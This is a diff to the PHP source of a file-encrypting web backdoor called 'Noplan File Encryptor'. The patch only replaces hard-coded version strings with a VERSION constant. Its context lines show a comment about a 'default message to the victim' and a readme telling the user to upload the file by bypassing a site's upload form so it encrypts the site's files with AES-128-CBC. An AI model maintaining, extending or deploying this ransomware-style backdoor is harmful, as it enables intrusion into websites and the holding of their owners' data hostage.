@@ -27,6 +27,12 @@
  **/
 
 /**
+ * Version Package
+ * 
+ */
+define('VERSION', 'v2.2');
+
+/**
  * Define the default message to the victim. You can set your own message from message field/form/
  * 
  */
@@ -402,11 +408,11 @@ class Decryptor
 		<?php $title = isset($_GET['m']) ? preg_replace('/[^a-z]*$/', '', $_GET['m']) : 'Readme';
 		switch ($title) {
 			case 'enc':
-				$title = 'NOPLAN FILE ENCRYPTOR v1.2';
+				$title = 'NOPLAN FILE ENCRYPTOR '.VERSION;
 				break;
 			
 			case 'dec':
-				$title = 'NOPLAN FILE DECRYPTOR v1.2';
+				$title = 'NOPLAN FILE DECRYPTOR '.VERSION;
 				break;
 
 			default:
@@ -544,7 +550,7 @@ class Decryptor
 		<?php } else { ?>
 
 			<div class="readme">
-				<h2>Noplan File Encryptor Backdoor v2.2</h2>
+				<h2>Noplan File Encryptor Backdoor <?= VERSION; ?></h2>
 
 				<p>Upload this file with bypassing site's form upload and Remote from browser. Fill the configuration form and let this file do the magic! The files will be encrypted with AES-128-CBC.</p>
 				
